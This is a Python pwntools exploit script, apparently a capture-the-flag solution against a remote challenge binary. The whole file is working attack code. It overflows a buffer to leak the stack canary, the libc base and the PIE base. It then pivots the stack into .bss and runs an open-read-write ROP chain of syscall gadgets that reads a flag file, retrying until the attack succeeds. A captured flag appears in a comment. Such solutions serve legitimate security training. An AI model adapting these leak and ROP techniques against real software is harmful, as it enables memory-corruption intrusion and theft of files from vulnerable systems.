#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./Test_Subject_087_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]
context.arch = 'amd64'

def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
b open
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10005)
    return io

def main():
    with conn() as io:
        info("setup 0x7f length payload")
        for _ in range(300):
            io.sendlineafter(b"> ", b"3")
            io.sendlineafter(b"> ", b"2")
            io.sendafter(b"> ", b"X" * 0x7f)

        info("prepare bof")
        for _ in range(3):
            io.sendlineafter(b"> ", b"1")
            for __ in range(8):
                io.sendlineafter(b"> ", b"xxxx")
        
        canary = None
        next_gadget_address = None
        flag_path_address = None
        flag_address = None

        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"y")

        io.recvuntil(b"The word has ")
        length = int(io.recvuntil(b" letters", drop=True))
        if length != 0x7f:
            warning("fail when leaking canary")
            return False
        else:
            info("leaking canary")
            io.sendafter(b"> ", b"A" * 0x19)
            io.recvuntil(b"A" * 0x19)
            canary = b"\x00" + io.recv(7)
            success(f"canary: {canary}")
        
        io.recvuntil(b"The word has ")
        length = int(io.recvuntil(b" letters", drop=True))
        if length != 0x7f:
            warning("fail when leaking libc base")
            return False
        else:
            info("leaking libc base")
            payload = b'A' * 0x48
            io.sendafter(b"> ", payload)
            io.recvuntil(payload)
            __libc_start_main_243_addr = int.from_bytes(io.recv(6), 'little')
            info(f"__libc_start_main+243_addr: {__libc_start_main_243_addr:#x}")
            libc.address = __libc_start_main_243_addr - libc.symbols["__libc_start_main"] - 243
            assert libc.address & 0xfff == 0, f"libc base wrong: {libc.address:#x}"
            assert libc.address > 0, f"libc base wrong: {libc.address:#x}"
            success(f"libc base: {libc.address:#x}")
        
        io.recvuntil(b"The word has ")
        length = int(io.recvuntil(b" letters", drop=True))
        if length != 0x7f:
            warning("fail when leaking pie base")
            return False
        else:
            info("leak pie base")
            payload = b"A" * 0x68
            io.sendafter(b"> ", payload)
            io.recvuntil(payload)
            main_address = int.from_bytes(io.recv(6), 'little')
            info(f"main address: {main_address:#x}")
            binary.address = main_address - binary.sym["main"]
            assert binary.address & 0xfff == 0, f"pie base wrong: {binary.address:#x}"
            assert binary.address > 0, f"pie base wrong: {binary.address:#x}"
            success(f"pie base: {binary.address:#x}")
        
        io.recvuntil(b"The word has ")
        length = int(io.recvuntil(b" letters", drop=True))
        if length != 0x7f:
            warning("fail when stack pivot")
            return False
        else:
            info("stack pivot")
            rop = ROP([binary, libc])
            next_gadget_address = binary.bss(0x400)
            flag_path_address = next_gadget_address - 0x30
            flag_address = next_gadget_address + 0x150
            info(f"next gadget address: {next_gadget_address:#x}")
            info(f"flag path address: {flag_path_address:#x}")
            info(f"flag address: {flag_address:#x}")
            rop.read(0, flag_path_address, flag_address - next_gadget_address)
            rop.raw(rop.find_gadget(["leave", "ret"]))
            payload = flat(
                {
                    0x18: canary,
                    0x20: next_gadget_address - 8,
                    0x28: rop.chain(),
                }
            , length=0x7f)
            io.sendafter(b"> ", payload)
        
        for _ in range(4):
            io.sendlineafter(b"> ", b"xxxx")

        info("orw ROP")
        rop = ROP([binary, libc])
        payload = flat([
            # open(&flag_path, 0, 0)
            rop.find_gadget(["pop rdi", "ret"]).address,
            flag_path_address,
            rop.find_gadget(["pop rsi", "ret"]).address,
            0,
            rop.find_gadget(["pop rdx", "ret"]).address,
            0,
            rop.find_gadget(["pop rax", "ret"]).address,
            constants.SYS_open,
            rop.find_gadget(["syscall", "ret"]).address,
            # read(fd, &flag_address, 0x100)
            rop.find_gadget(["pop rdi", "ret"]).address,
            3,
            rop.find_gadget(["pop rsi", "ret"]).address,
            flag_address,
            rop.find_gadget(["pop rdx", "ret"]).address,
            0x100,
            rop.find_gadget(["pop rax", "ret"]).address,
            constants.SYS_read,
            rop.find_gadget(["syscall", "ret"]).address,
            # write(1, &flag_address, 0x100)
            rop.find_gadget(["pop rdi", "ret"]).address,
            1,
            rop.find_gadget(["pop rsi", "ret"]).address,
            flag_address,
            rop.find_gadget(["pop rdx", "ret"]).address,
            0x100,
            rop.find_gadget(["pop rax", "ret"]).address,
            constants.SYS_write,
            rop.find_gadget(["syscall", "ret"]).address,
        ])
        payload = flat({
            0x00: b"/home/test_subject_087/flag\0",
            next_gadget_address - flag_path_address: payload
        })
        io.send(payload)

        result = io.recvall()
        # print(result)

        if b"ADL" in result:
            flag = result[result.index(b"ADL"): result.index(b"}") + 1].decode()
            success(f"flag: {flag}") # ADL{4ny4_k0r3_5uk1_https://youtu.be/ZMV5aoQ5yko}
            return True
        else:
            return False


if __name__ == "__main__":
    while True:
        try:
            binary.address = 0
            libc.address = 0
            if main():
                exit(0)
        except AssertionError as e:
            warning(str(e))
            pass
